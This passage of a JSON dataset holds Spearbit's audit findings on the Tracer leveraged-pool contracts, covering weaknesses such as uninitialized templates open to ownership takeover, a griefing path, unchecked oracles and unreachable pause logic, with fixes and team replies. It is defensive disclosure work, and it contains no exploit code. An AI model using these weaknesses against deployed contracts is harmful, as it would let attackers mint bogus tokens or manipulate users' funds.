        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6753",
      "title": "Incorrect comparison in getUpdatedAggregateBalance()",
      "impact": "LOW",
      "content": "## Code Review Report\n\n## Severity\n**Low Risk**\n\n## Context\n**File:** PoolSwapLibrary.sol  \n**Lines:** 476-490\n\n## Description\nWhen the value of `data.updateIntervalId` accidentally happens to be larger than `data.currentUpdateIntervalId` in the `getUpdatedAggregateBalance()` function, it will execute the rest of the function, which shouldnt happen. Although this is unlikely, it is also very easy to prevent.\n\n```solidity\nfunction getUpdatedAggregateBalance(UpdateData calldata data) external pure returns (...) {\n    if (data.updateIntervalId == data.currentUpdateIntervalId) {\n        // Update interval has not passed: No change\n        return (0, 0, 0, 0, 0);\n    }\n}\n```\n\n## Recommendation\nThe code should be changed to:\n\n```solidity\nfunction getUpdatedAggregateBalance(UpdateData calldata data) external pure returns (...) {\n    - if (data.updateIntervalId == data.currentUpdateIntervalId) {\n    + if (data.updateIntervalId >= data.currentUpdateIntervalId) {\n        // Update interval has not passed: No change\n        return (0, 0, 0, 0, 0);\n    }\n}\n```\n\n## Tracer\nValid, fixed in commit 259386d.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6752",
      "title": "It is not possible to call executeCommitments() for multiple old commits",
      "impact": "MEDIUM",
      "content": "## Medium Risk Analysis\n\n## Context\n`poolUpkeep()` in `LeveragedPool`\n\n## Description\nAssuming the pool has not been updated for many update intervals, `performUpkeepSinglePool()` can call `poolUpkeep()` repeatedly with `_boundedIntervals == true` and a bounded amount of gas to fix this situation.\n\nIn this context, the following problem occurs:\n- In the first run of `poolUpkeep()`, `lastPriceTimestamp` will be set to `block.timestamp`.\n- In the next run of `poolUpkeep()`, processing will stop at `require(intervalPassed(), ..)`, because `block.timestamp` hasnt increased.\n\nThis means the rest of the commitments wont be executed by `executeCommitments()` and `updateIntervalId`, which is updated in `executeCommitments()`, will start lagging.\n\n### Function Code\n```solidity\nfunction poolUpkeep(..., bool _boundedIntervals, uint256 _numberOfIntervals) external override onlyKeeper {\n    require(intervalPassed(), \"Update interval hasn't passed\"); \n    executePriceChange(_oldPrice, _newPrice); \n    IPoolCommitter(poolCommitter).executeCommitments(_boundedIntervals, _numberOfIntervals);\n    lastPriceTimestamp = block.timestamp; \n}\n```\n```solidity\nfunction intervalPassed() public view override returns (bool) {\n    unchecked {\n        return block.timestamp >= lastPriceTimestamp + updateInterval;\n    }\n}\n```\n\n## Recommendation\n- Redesign the logic with `boundedIntervals` (see the related issues).\n- Update `lastPriceTimestamp` only once all old commitments are processed.\n- Ensure `executePriceChange()` is only executed once for a series of old commitments to prevent negative side effects.\n\n## Tracer\nAs part of PR 392, we have a hardcoded limit to avoid running out of gas, but this also solves the user-supplied data problems. Let us know if you think this is a valid solution.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThe bug report describes an issue with the poolUpkeep() function in LeveragedPool. The bug is of medium risk and occurs when the pool has not been updated for many update intervals. In this context, the first run of poolUpkeep() sets lastPriceTimestamp to block.timestamp and the next run of poolUpkeep() stops at require(intervalPassed(),..) because block.timestamp hasnt increased. This means the rest of the commitments wont be executed by executeCommitments() and updateIntervalId will start lagging.\n\nThe recommendation to fix this bug is to redesign the logic with boundedIntervals, update lastPriceTimestamp only once all old commitments are processed, and ensure executePriceChange() is only executed once for a series of old commitments to prevent negative side effects. As part of PR 392, there is a hardcoded limit to avoid running out of gas, but this also solves the user-supplied data problems.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6751",
      "title": "performUpkeepSinglePool() can result in a griefing attack when the pool has not been updated for many intervals",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n`executeCommitments()` in `PoolCommitter`\n\n## Description\nAssuming the pool has not been updated for many update intervals, `performUpkeepSinglePool()` can call `poolUpkeep()` repeatedly with `_boundedIntervals == true` and a bounded amount of gas to fix this situation. This in turn will call `executeCommitments()` repeatedly. \n\nFor each call to `executeCommitments()`, the `updateMintingFee()` function will be called. This updates fees and changes them in an unexpected way. A griefing attack is possible by repeatedly calling `executeCommitments()` with `boundedIntervals == true` and `numberOfIntervals == 0`.\n\n**Note:** Also see issue: \"It is not possible to call executeCommitments() for multiple old commits.\" It is also important that `lastPriceTimestamp` is only updated after the last `executeCommitments()`, otherwise it will revert.\n\n```solidity\nfunction executeCommitments(bool boundedIntervals, uint256 numberOfIntervals) external override onlyPool {\n    ...\n    uint256 upperBound = boundedIntervals ? numberOfIntervals : type(uint256).max;\n    ...\n    while (i < upperBound) {\n        if (block.timestamp >= lastPriceTimestamp + updateInterval * counter) {\n            // lastPriceTimestamp shouldn't be updated too soon\n            ...\n        }\n    }\n    ...\n    updateMintingFee(); // should do this once (in combination with _boundedIntervals==true)\n    ...\n}\n```\n\n## Recommendation\nEnsure `updateMintingFee()` is only called once in a series of calls to `executeCommitments()` with `_boundedIntervals == true`.\n\n## Tracer\nWe want the minting fee to be the most up-to-date whenever anyone commits to a mint. This means we do not need to update it every iteration, but we do want to make sure it is the most up-to-date at the end of the commitment executions.\n\nIn the case of not executing all update intervals, we think it makes sense to still update the minting fee, so if someone commits to a mint between this call to `executeCommitments()` and the next, they at least have a minting fee that has been updated since the last update interval.\n\n**Addressed in:** PR 413.\n\n**Spearbit:** Acknowledged.",
      "summary": "\nThis bug report is about a potential griefing attack in the executeCommitments() function in PoolCommitter. The attack is possible if the pool has not been updated for many update intervals, and the executeCommitments() function is called repeatedly with _boundedIntervals == true and a bounded amount of gas. This can lead to the updateMintingFee() function being called multiple times, which leads to unexpected changes in fees.\n\nThe recommendation is to ensure that updateMintingFee() is only called once in a series of calls to executeCommitments(). This is to ensure that the minting fee is the most up-to-date whenever anyone commits to a mint. The bug has been addressed in PR 413.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6750",
      "title": "Incorrect calculation of keeper reward",
      "impact": "MEDIUM",
      "content": "## Risk Assessment\n\n**Severity:** Medium Risk  \n**Context:** PoolKeeper.sol#L251-L259  \n\n## Description\nThe keeper reward is calculated as \n\n```\n(keeperGas * tipPercent / 100) / 1e18\n```\n\nThe division by `1e18` is incorrect and undervalues the reward for the keeper. The tip part of the keeper reward is essentially ignored. The likely cause of this miscalculation is based on the note at `PoolKeeper.sol#244` which states the tip percent is in WAD units, but it really is a quad representation of a value in the range between 5 and 100.\n\nThe comment at `PoolKeeper.sol#L241` also incorrectly states that `_keeperGas` is in wei (usually referring to ETH), which is not the case as it is denominated in the quote token, but in WAD precision.\n\n## Recommendation\nThe division by `FIXED_POINT` should be removed, and the comments should be corrected.\n\n```solidity\nint256 wadRewardValue = ABDKMathQuad.toInt(\n    ABDKMathQuad.add(\n        ABDKMathQuad.fromUInt(_keeperGas),\n        -ABDKMathQuad.div(\n            (\n                ABDKMathQuad.div(\n                    (ABDKMathQuad.mul(ABDKMathQuad.fromUInt(_keeperGas), _tipPercent)),\n                    ABDKMathQuad.fromUInt(100)\n                )\n            ),\n            -FIXED_POINT\n        )\n    )\n);\n```\n\n**Tracer:** Valid, addressed in PR 391 and PR 428.  \n**Spearbit:** Acknowledged.",
      "summary": "\nThis bug report refers to a miscalculation in the keeper reward calculation in the PoolKeeper.sol file. The reward is calculated as (keeperGas * tipPercent / 100) / 1e18, however the division by 1e18 is incorrect and undervalues the reward for the keeper. The likely cause of this miscalculation is based on the note at PoolKeeper.sol#244 which states the tip percent is in WAD units, but it really is a quad representation of a value in the range between 5 and 100. The comment at PoolKeeper.sol#L241 also incorrectly states that _keeperGas is in wei(usually referring to ETH), which is not the case as it is denominated in the quote token, but in WAD precision. \n\nThe recommended solution is to remove the division by FIXED_POINT and correct the comments. This bug has been acknowledged and addressed in PR 391 and PR 428.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6749",
      "title": "Authenticity check for oracles is not effective",
      "impact": "MEDIUM",
      "content": "## Security Analysis\n\n**Severity:** Medium Risk  \n**Context:** PoolFactory.sol#L93-L101  \n\n**Description:**  \nThe `deployPool()` function verifies the authenticity of the `oracleWrapper` by calling its `deployer()` function. As the `oracleWrapper` is supplied via `deploymentParameters`, it can be a malicious contract whose `deployer()` function can return any value, including `msg.sender`.\n\n**Note:**  \nThis check does protect against frontrunning the deployment transaction of the same pool. See Undocumented frontrunning protection.\n\n```solidity\nfunction deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) {\n    ...\n    require(IOracleWrapper(deploymentParameters.oracleWrapper).deployer() == msg.sender, \n    \"Deployer must be oracle wrapper owner\");\n}\n```\n\n**Recommendation:**  \nConsider using an allowlist for oracles.\n\n**Tracer:**  \nAs decided by the core Tracer team, no allowlists are going to be added. We do agree, though, that there is a risk. To address it without impinging on any degree of permissionlessness, the DAO will be carrying out security checks to give a safety score (akin to Rari protocols security checks).\n\n**Spearbit:**  \nAcceptable if it is clearly shown in the user interface.",
      "summary": "\nThis bug report is about the PoolFactory.sol file and the deployPool() function. The deployPool() function verifies the authenticity of the oracleWrapper by calling its deployer() function. However, since the oracleWrapper is supplied via deploymentParameters, it can be a malicious contract whose deployer() function can return any value, including msg.sender. This check does protect against frontrunning the deployment transaction of the same pool.\n\nThe recommendation is to consider using an allowlist for oracles. The core Tracer team has decided against adding allowlists, but they do acknowledge the risk. To address the risk without impinging on any degree of permissionlessness, the DAO will be carrying out security checks to give a safety score. It is acceptable if it is clearly shown in the user interface.",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6748",
      "title": "getPendingCommits() underreports commits",
      "impact": "MEDIUM",
      "content": "## Severity Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`PoolCommitter.sol#L764`\n\n## Description\nWhen `frontRunningInterval > updateInterval`, the `PoolCommitter.getAppropriateUpdateIntervalId()` function can return `updateInterval` IDs that are arbitrarily far into the future, especially if `appropriateIntervalId > updateIntervalId + 1`. \n\nTherefore, commits can also be made to these appropriate interval IDs far in the future by calling `commit()`. The `PoolCommitter.getPendingCommits()` function only checks the commits for `updateIntervalId` and `updateIntervalId + 1`, but needs to check up to `updateIntervalId + factorDifference + 1`. Currently, it is underreporting the pending commits, which leads to the `checkInvariants` function not checking the correct values.\n\n## Recommendation\nThe `getPendingCommits` function should return all possible pending commits even in the case where `frontRunningInterval > updateInterval`.\n\n## Tracer\nAs part of the CARE program, we found that `getPendingCommits()` can be removed in favour of a running total of pending mints. This was done and merged into the main repository in **PR 315**.\n\n## Spearbit\nThe fix looks good, but naming the variable `totalPendingMints` is a bit ambiguous because:\n- It sounds like it is a pool token amount, but it is a quote token amount. However, the naming for other vars (e.g., `longMintAmount`) never distinguished this either, so at least it is consistent.\n- It does not include mints from `shortBurnLongMint` / `longBurnShortMint`, which are also mints. It does not include these because you do not need to track it for the invariant checks. You could add a remark here about the exclusion.\n\n## Tracer\nAddressed in **issue 368** and **PR 403**.\n\n## Spearbit\nVariable names were refactored in **PR 403** to indicate if they are in settlement tokens or pool tokens.",
      "summary": "\nThis bug report is about a PoolCommitter.sol#L764 function which can return updateInterval IDs that are arbitrarily far into the future when frontRunningInterval is greater than updateInterval. This leads to the checkInvariants function not checking the correct values as the getPendingCommits function only checks the commits for updateIntervalId and updateIntervalId+1. \n\nThe recommendation is to have the getPendingCommits function return all possible pending commits even in the case where frontRunningInterval is greater than updateInterval. As part of the CARE program, it was found that getPendingCommits() can be removed in favour of a running total of pending mints, which was done and merged into the main repository in PR 315.\n\nVariable names were refactored in PR 403 to indicate if they are in settlement tokens or pool tokens, addressing the issue of naming the variable totalPendingMints being ambiguous. This was done in issue 368 and PR 403.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6747",
      "title": "Oracles are not updated before use",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- `PoolKeeper.sol#L71`\n- `PoolKeeper.sol#L281`\n\n## Description\nThe `PoolKeeper` contract uses two oracles but does not ensure that their prices are updated. The `poll()` function should be called on both oracles to get the first execution and the settlement / ETH prices. As it currently is, the code could operate on old data.\n\n## Recommendation\nPrice should be updated before using it. Note that calling `poll()` can revert in certain cases depending on the oracle type if:\n1. It does not have enough data to create an SMA.\n2. Not enough time has passed since it was last updated (require(block.timestamp >= lastUpdate + updateInterval, \"SMA: Too early to update\")).\n\nTherefore, it is recommended to add a `try {} catch {}` block as shown in the code below:\n\n```solidity\nfunction newPool(address _poolAddress) external override onlyFactory {\n    + try IOracleWrapper(ILeveragedPool(_poolAddress).oracleWrapper()).poll() {} catch Error(string memory reason) {}\n    int256 firstPrice = ILeveragedPool(_poolAddress).getOraclePrice();\n    ...\n}\n```\n\n```solidity\nfunction performUpkeepSinglePool(...) public override {\n    ...\n    try pool.poolUpkeep(lastExecutionPrice, latestPrice, _boundedIntervals, _numberOfIntervals) {\n        ...\n        + try IOracleWrapper(ILeveragedPool(_pool).settlementEthOracle()).poll() {} catch Error(string memory reason) {}\n        payKeeper(_pool, gasPrice, gasSpent, savedPreviousUpdatedTimestamp, updateInterval);\n        ...\n    } catch Error(string memory reason) {\n        ...\n    }\n}\n```\n\n## Tracer\nRegarding the `settlementEthOracle`, this should be a spot oracle, in which case `poll()` is a no-op. We are not sure if we should then still include a call to its `poll()` function. For the pools main Oracle wrapper, it is OK to not call the `poll()` function when the pool is added because it is polled right when the pool upkeeps. This means the latest poll will get the most up-to-date price. We also now have a ramping-up feature in the SMA oracle when it is populated fewer times than the total number of periods available.\n\n## Spearbit\nRegarding the `settlementEthOracle`, this should be a spot oracle, in which case `poll()` is a no-op. We are not sure if we should then still include a call to its `poll()` function. If spot oracle means `ChainlinkOracleWrapper` contract instead of `SMAOracle`, calling `poll()` for it does not change its state because it is the same as `getPrice()`. However, the `settlementOracle` is chosen by the deployer, and people might as well deploy an `SMAOracle`, even if you intend it to be used differently, because your intent is not documented anywhere. In this case, it is better to trigger a `poll()` or document that it should be a spot oracle.\n\nFor the pools main oracle wrapper, it is OK to not call the `poll()` function when the pool is added because it is polled right when the pool upkeeps, meaning the latest poll will be the most up-to-date price update. We agree that you are already calling `poll()` on upkeep. This is about calling `poll()` for the `startingPrice` in `newPool`, so the pools start price is the latest one.\n\n## Tracer\nWe agree that you are already calling `poll()` on upkeep. This is about calling `poll()` for the `startingPrice` in `newPool`, so the pools start price is the latest one. Good point.\n\n## Spearbit\nThe recommendation has been implemented in PR 400 with the addition that if the poll fails, it will also emit a `PoolUpkeepError`.",
      "summary": "\nA bug has been identified in the PoolKeeper contract which uses two oracles but does not ensure that their prices are updated. The poll() function should be called on both oracles to get the first execution and the settlement/ETH prices. This could cause the code to operate on old data. \n\nIn order to prevent this, it is recommended to add a try {} catch {} block. This would update the price before using it, and also account for any errors that may occur if there is not enough data to create an SMA or if not enough time has passed since it was last updated. \n\nThe recommendation has been implemented in PR 400 with the addition that if the poll fails, it will also emit a PoolUpkeepError.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6746",
      "title": "pairTokenBase and poolBase template contracts instances are not initialized",
      "impact": "MEDIUM",
      "content": "## Security Report\n\n## Severity\n**Medium Risk**\n\n## Context\n- `PoolFactory.sol#L66-L81`\n- `PoolToken.sol#L9-L14`\n- `ERC20_Cloneable.sol#L33-L72`\n- `LeveragedPool.sol#L90-L133`\n\n## Description\nThe constructor of the `PoolFactory` contract creates three template contract instances, but only one is initialized: `poolCommitterBase`. The other two contract instances (`pairTokenBase` and `poolBase`) are not initialized.\n\n```solidity\ncontract PoolFactory is IPoolFactory, Ownable {\n    constructor(address _feeReceiver) {\n        ...\n        PoolToken pairTokenBase = new PoolToken(DEFAULT_NUM_DECIMALS); // not initialized\n        pairTokenBaseAddress = address(pairTokenBase);\n        LeveragedPool poolBase = new LeveragedPool(); // not initialized\n        poolBaseAddress = address(poolBase);\n        PoolCommitter poolCommitterBase = new PoolCommitter(); // is initialized\n        poolCommitterBaseAddress = address(poolCommitterBase);\n        ...\n        /* initialise base PoolCommitter template (with dummy values) */\n        poolCommitterBase.initialize(address(this), address(this), address(this), owner(), 0, 0, 0);\n    }\n}\n```\n\nThis means an attacker can initialize the templates, setting them as the owner and performing owner actions on contracts such as minting tokens. This can be misleading for users of the protocol as these minted tokens seem to be valid tokens.\n\nIn `PoolToken.initialize()`, an attacker can become the owner by calling `initialize()` with an address under their control as a parameter. The same can happen in `LeveragedPool.initialize()` with the initialization parameter.\n\n```solidity\ncontract PoolToken is ERC20_Cloneable, IPoolToken {\n    ...\n}\n\ncontract ERC20_Cloneable is ERC20, Initializable {\n    function initialize(address _pool, ) external initializer { // not called for the template contract\n        owner = _pool;\n        ...\n    }\n}\n\ncontract LeveragedPool is ILeveragedPool, Initializable, IPausable {\n    function initialize(ILeveragedPool.Initialization calldata initialization) external override\n        initializer { \n        // not called for the template contract\n        ...\n        // set the owner of the pool. This is governance when deployed from the factory\n        governance = initialization._owner;\n    }\n}\n```\n\n## Recommendation\n`pairTokenBase` and `poolBase` should be initialized with dummy values. Consider using the upgradable versions of the OpenZeppelin ERC20 contracts, as they dont have constructors.\n\n## Tracer\n**Valid**, fixed in PR 396.\n\n## Spearbit\n**Acknowledged.**",
      "summary": "\nThis bug report is about a vulnerability in the PoolFactory contract, which is part of a protocol. It was found that the constructor of the PoolFactory contract creates three template contract instances, but only one of them, the PoolCommitterBase, is initialized. This means an attacker can initialize the other two templates, pairTokenBase and poolBase, setting them as the owner and perform owner actions on the contracts such as minting tokens. InPoolToken.initialize() and LeveragedPool.initialize() an attacker can also become the owner by calling initialize() with an address under their control as a parameter. This can be misleading for users of the protocol as the minted tokens seem to be valid tokens.\n\nThe recommendation is to initialize pairTokenBase and poolBase with dummy values and to consider using the upgradable versions of the OpenZeppelin ERC20 contracts, which don't have constructors. The bug has been fixed in PR 396, and has been acknowledged.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6745",
      "title": "Pools can be deployed with malicious or incorrect quote tokens and oracles",
      "impact": "MEDIUM",
      "content": "## Vulnerability Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`PoolFactory.sol#L93-L174`\n\n## Description\nThe deployment of a pool via `deployPool()` is permissionless. The deployer provides several parameters that have to be trusted by the users of a specific pool. These parameters include:\n\n- `oracleWrapper`\n- `settlementEthOracle`\n- `quoteToken`\n- `invariantCheck`\n\nIf any one of them is malicious, then the pool and its value will be affected.\n\n**Note:** Separate findings are made for the deployer check (issue: \"Authenticity check for oracles is not effective\") and the `invariantCheck` (issue: \"Two different `invariantCheck` variables used in `PoolFactory.deployPool()`\").\n\n## Recommendation\nAlthough this is a general risk with permissionless protocols, it is possible to add extra controls (such as allowlists) on quote tokens and the corresponding `settlementEthOracle` oracle. An additional benefit of allowlisting quote tokens and corresponding oracles is that the oracles could be shared, thus saving gas.\n\n## Tracer\nAs decided by the core Tracer team, no allowlists are going to be added. We do agree, though, that there is a risk. To address it without impinging on any degree of permissionlessness, the DAO will be carrying out security checks to give a safety score (akin to Rari protocols security checks).\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report outlines the potential risk associated with the deployment of a pool via deployPool() in PoolFactory.sol#L93-L174. The deployer of the pool provides several parameters that must be trusted by users, such as an oracleWrapper, settlementEthOracle, quoteToken, and invariantCheck. If any of these parameters are malicious, the pool and its value can be affected. \n\nThe report recommends adding extra controls, such as allowlists, on quote tokens and corresponding oracles to reduce the risk. However, the core Tracer team has decided to not implement allowlists. Instead, the DAO will carry out security checks to provide a safety score as a measure of risk reduction. This has been acknowledged by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6744",
      "title": "The value of lastExecutionPrice fails to update if pool.poolUpkeep() reverts",
      "impact": "MEDIUM",
      "content": "## Medium Risk Advisory\n\n## Severity\nMedium Risk\n\n## Context\n`PoolKeeper.sol#L119-L161`\n\n## Description\nThe `performUpkeepSinglePool()` function of the `PoolKeeper` contract updates `executionPrice[]` with the latest price and calls `pool.poolUpkeep()` to process the price difference. However, `pool.poolUpkeep()` can revert, for example, due to the `checkInvariantsBeforeFunction` modifier in `mintTokens()`. \n\nIf `pool.poolUpkeep()` reverts, then the previous price value is lost and the processing will not be accurate. Therefore, it is safer to store the new price only if `pool.poolUpkeep()` has been executed successfully.\n\n```solidity\nfunction performUpkeepSinglePool(...) public override {\n    ...\n    int256 lastExecutionPrice = executionPrice[_pool];\n    executionPrice[_pool] = latestPrice; // previous price can get lost if poolUpkeep() reverts\n    ...\n    try pool.poolUpkeep(lastExecutionPrice, latestPrice, _boundedIntervals, _numberOfIntervals) {\n        ... // executionPrice[_pool] should be updated here\n    } catch Error(string memory reason) {\n        ...\n    }\n}\n```\n\n## Recommendation\nTo prevent losing the `latestPrice` value, the `executionPrice[_pool]` variable should be updated only if `poolUpkeep()` doesnt revert.\n\n```solidity\nfunction performUpkeepSinglePool(...) public override {\n    ...\n    int256 lastExecutionPrice = executionPrice[_pool];\n    // executionPrice[_pool] = latestPrice; // This line is problematic\n    ...\n    try pool.poolUpkeep(lastExecutionPrice, latestPrice, _boundedIntervals, _numberOfIntervals) {\n        executionPrice[_pool] = latestPrice; // Update only after successful execution\n    } catch Error(string memory reason) {\n        ...\n    }\n}\n```\n\nAlternatively, the administration of the `executionPrice` could be done within the called `poolUpkeep()` function of the `LeveragedPool` contract.\n\n## Tracer\nValid, fixed in PR 327.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThe PoolKeeper contract has an issue with the performUpkeepSinglePool() function. This function updates the executionPrice[] with the latest price and calls pool.poolUpkeep() to process the price difference. However, if pool.poolUpkeep() reverts, then the previous price value is lost and the processing will not be accurate. \n\nTo prevent this, the executionPrice[_pool] variable should be updated only if poolUpkeep() does not revert. Alternatively, the administration of the executionPrice s could be done within the called poolUpkeep() function of the LeveragedPool contract. \n\nThe issue has been fixed in PR 327.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6743",
      "title": "Paused state cant be set and therefore withdrawQuote() cant be executed",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n**InvariantCheck, LeveragedPool, PoolCommitter**\n\n## Description\nThe `checkInvariants()` function of the InvariantCheck contract is called via the modifiers `checkInvariantsBeforeFunction()` and `checkInvariantsAfterFunction()` of both LeveragedPool and PoolCommitter contracts. It is meant to pause the contracts if the invariant checks dont hold.\n\nThe aforementioned modifiers also contain the `require(!paused, \"Pool is paused\");` statement, which reverts the entire transaction and resets the paused variable that was just set. Furthermore, the paused state can only be set by the InvariantCheck contract due to the `onlyInvariantCheckContract` modifier. Thus, the paused variable will never be set to `true`, making `withdrawQuote()` impossible to execute because it requires the contract to be paused.\n\nThis means that the quote tokens will always stay in the pool even if invariants dont hold and all other actions are blocked.\n\n## Relevant parts of the code\nThe `checkInvariants()` function calls `InvariantCheck.pause()` if the invariants dont hold. The latter calls `pause()` in LeveragedPool and PoolCommitter:\n\n```solidity\ncontract InvariantCheck is IInvariantCheck {\n    function checkInvariants(address poolToCheck) external override {\n        ...\n        pause(IPausable(poolToCheck), IPausable(address(poolCommitter)));\n        ...\n    }\n    \n    function pause(IPausable pool, IPausable poolCommitter) internal {\n        pool.pause();\n        poolCommitter.pause();\n    }\n}\n```\n\nIn LeveragedPool and PoolCommitter contracts, the `checkInvariantsBeforeFunction()` and `checkInvariantsAfterFunction()` modifiers will make the transaction revert if `checkInvariants()` sets the paused state.\n\n```solidity\ncontract LeveragedPool is ILeveragedPool, Initializable, IPausable {\n    modifier checkInvariantsBeforeFunction() {\n        invariantCheck.checkInvariants(address(this)); // can set paused to true\n        require(!paused, \"Pool is paused\"); // will reset pause again\n        _;\n    }\n    \n    modifier checkInvariantsAfterFunction() {\n        require(!paused, \"Pool is paused\");\n        _;\n        invariantCheck.checkInvariants(address(this)); // can set paused to true\n        require(!paused, \"Pool is paused\"); // will reset pause again\n    }\n    \n    function pause() external override onlyInvariantCheckContract { // can only be called from InvariantCheck\n        paused = true;\n        emit Paused();\n    }\n}\n```\n\n```solidity\ncontract PoolCommitter is IPoolCommitter, Initializable {\n    modifier checkInvariantsBeforeFunction() {\n        invariantCheck.checkInvariants(leveragedPool); // can set paused to true\n        require(!paused, \"Pool is paused\"); // will reset pause again\n        _;\n    }\n    \n    modifier checkInvariantsAfterFunction() {\n        require(!paused, \"Pool is paused\");\n        _;\n        invariantCheck.checkInvariants(leveragedPool); // can set paused to true\n        require(!paused, \"Pool is paused\"); // will reset pause again\n    }\n    \n    function pause() external onlyInvariantCheckContract { // can only be called from InvariantCheck\n        paused = true;\n        emit Paused();\n    }\n}\n```\n\n## Recommendation\nThis issue is also discussed in `modifiers-undermine-contract-pausing` and there are a few reasons to reconsider fixing it:\n- When a transaction triggers an invariant check and it is rolled back due to the revert, other transactions might still be executed. With a paused state, this wouldnt happen.\n- Pause functionality that doesnt work is misleading for developers and code reviewers. It is better to delete the dead code, which also saves gas.\n- `withdrawQuote()` cannot be executed since the pause state is unreachable.\n\nIf it is preferable to use the pause functionality, it can be done by having a surrounding contract that stores the pause state and calls the underlying logic with a try mechanism. The underlying logic can then be reverted while the surrounding contract keeps the paused state.\n\nHere is an implementation example of a surrounding contract that handles the revert and sets the pause variable. The code that checks the invariants reverts with the `InvariantsFail()` custom error, which is caught by the try/catch block in the caller and the paused state is set.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.11;\nimport \"hardhat/console.sol\";\n\ncontract Pool {\n    error InvariantsFail();\n    \n    function DoSomething() public pure {\n        revert InvariantsFail();\n    }\n}\n\ncontract InvariantCheck {\n    Pool myPool = new Pool();\n    bool pause;\n\n    function TryDoSomething() public returns (string memory) {\n        try myPool.DoSomething() {\n            return \"Ok\";\n        } catch Error(string memory reason) {\n            return reason;\n        } catch Panic(uint) {\n            return \"Panic\";\n        } catch (bytes memory reason) {\n            if (bytes4(reason) == bytes4(abi.encodeWithSignature(\"InvariantsFail()\"))) {\n                pause = true;\n                return(\"InvariantsFail\");\n            }\n            return \"Unknown\";\n        }\n    }\n\n    constructor() {\n        console.log(\"Pause =\",pause);\n        